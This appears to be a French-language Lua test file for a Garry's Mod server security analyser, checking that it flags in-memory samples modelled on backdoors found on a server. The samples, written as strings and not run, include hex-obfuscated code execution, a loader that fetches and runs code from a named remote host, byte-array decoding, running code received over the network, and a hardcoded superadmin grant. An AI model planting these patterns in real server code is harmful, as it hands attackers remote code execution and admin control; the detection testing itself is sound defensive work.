-- Test de l'analyseur de sécurité (sv_security.lua) sur des échantillons en mémoire, reproduisant les portes
-- dérobées trouvées le 2026-11-02. Rien n'est exécuté ni écrit sur le disque.
-- Console serveur : lua_openscript securite_tests/test_analyse.lua
local function out(ok, msg) print(string.format("[Astral Test] %s %s", ok and "OK   " or "ECHEC", msg)) end
local A = Astral and Astral.Security and Astral.Security.AnalyseCode
if not A then return out(false, "analyseur absent") end

local function has(list, sev, word)
	for _, f in ipairs(list) do if f.severity == sev and f.kind:find(word, 1, true) then return f end end
end

local hex = ""
for c in ("CompileString"):gmatch(".") do hex = hex .. string.format("\\x%02X", c:byte()) end
local samples = {
	{ "fausse texture (npc_help.lua)", 'local f = _G["' .. hex .. '"]\nf(file.Read("materials/npc/help.vtf", "GAME"), "x")()', "critique", "codes hexadécimaux", 2 - 1 },
	{ "chargeur dans la texture", 'timer.Simple(1, function() http.Fetch("https://kvcdoor.ovh/f.php", function(b) RunString(b, ":", false) end) end)', "critique", "kvcdoor.ovh", 1 },
	{ "téléchargement + exécution", 'http.Fetch("https://exemple.invalid", function(b)\n\tRunString(b)\nend)', "critique", "Télécharge", 2 },
	{ "tableau d'octets", "local AE = {" .. string.rep("120, ", 45) .. "1}\nlocal s = ''\nfor _, b in ipairs(AE) do s = s .. string.char(b - 96) end\nCompileString(s, 'x')()", "critique", "tableau", 1 },
	{ "code reçu du réseau", 'net.Receive("x", function() RunString(net.ReadString()) end)', "critique", "réseau", 1 },
	{ "fichier de données exécuté", 'RunString(file.Read("data/x.txt", "GAME"))', "critique", "fichier de données", 1 },
	{ "rang donné en dur", 'hook.Add("PlayerInitialSpawn", "x", function(p) if p:SteamID() == "STEAM_0:1:12345678" then p:SetUserGroup("superadmin") end end)', "haute", "rang", 1 },
}
for _, s in ipairs(samples) do
	local f = has(A(s[2]), s[3], s[4])
	out(f ~= nil and f.line == s[5], s[1] .. " → " .. (f and (f.severity .. " « " .. f.kind .. " » ligne " .. f.line) or "non détecté"))
end

-- Code normal : aucun constat
local clean = A('hook.Add("Think", "x", function() local p = player.GetAll() for _, v in ipairs(p) do v:SetHealth(100) end end)\nhttp.Fetch("https://api.github.com", function(b) print(#b) end)')
out(#clean == 0, "code normal sans constat (" .. #clean .. ")")
